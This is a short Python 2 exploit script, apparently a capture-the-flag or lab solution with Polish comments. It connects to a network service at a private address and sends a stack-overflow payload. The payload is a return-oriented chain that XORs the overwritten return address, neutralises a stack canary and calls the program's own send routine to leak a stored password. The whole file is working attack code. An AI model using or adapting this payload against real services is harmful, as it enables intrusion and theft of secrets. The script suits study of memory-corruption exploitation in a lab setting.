# -*- coding: utf-8 -*-
import struct, socket

HOST = '172.16.0.102'
PORT = 24242

s = socket.socket()
s.connect((HOST, PORT))

# oryginalny adres powrotu na stosie
first_return_addr = 0x08056AFA
# placeholder na zmienne których zawartość jest nieważna
placeholder = 'xxxx'

gadget_pop_xor = struct.pack('<I', 0x080578f5 ^ first_return_addr)
password_addr = struct.pack('<I', 0x0805F0C0)
socksend_addr = struct.pack('<I', 0x0804884B)
exit_addr = struct.pack('<I', 0x08048670)

def get_payload(counter):
    # xorujemy z 1, bo chcemy żeby counter przyjął 1
    counter_xor = struct.pack('<I', counter ^ 1)
    # składamy payload
    return (
            # adres funkcji socksend (znany)
            socksend_addr
            # adres powrotu z funkcji socksend do exit
            + exit_addr
            # deskryptor dla socksend (przewidywana wartość)
            + struct.pack('<I', 4)
            # adres zmiennej globalnej password dla socksend
            + password_addr
            # ilość bajtów do przeczytania dla socksend
            + struct.pack('<I', 256)
            # wolne miejsce na stosie (niezajęta część bufora)
            + placeholder * 39
            # xorowane z kanarkiem
            + '\0\0\0\0'
            # puste miejsce na stosie
            + placeholder * 3
            # podmieniamy adres powrotu na gadget_pop
            + gadget_pop_xor
            # xorowane z niepotrzebnym już argumentem z adresem bufora
            + placeholder
            # zerowanie countera
            + counter_xor
            )

# zmierzenie długości payloadu
payload_length = len(get_payload(123))
# i stworzenie ostatecznego payloadu
payload = get_payload(payload_length - 1)
s.send(payload)
print s.recv(99999)
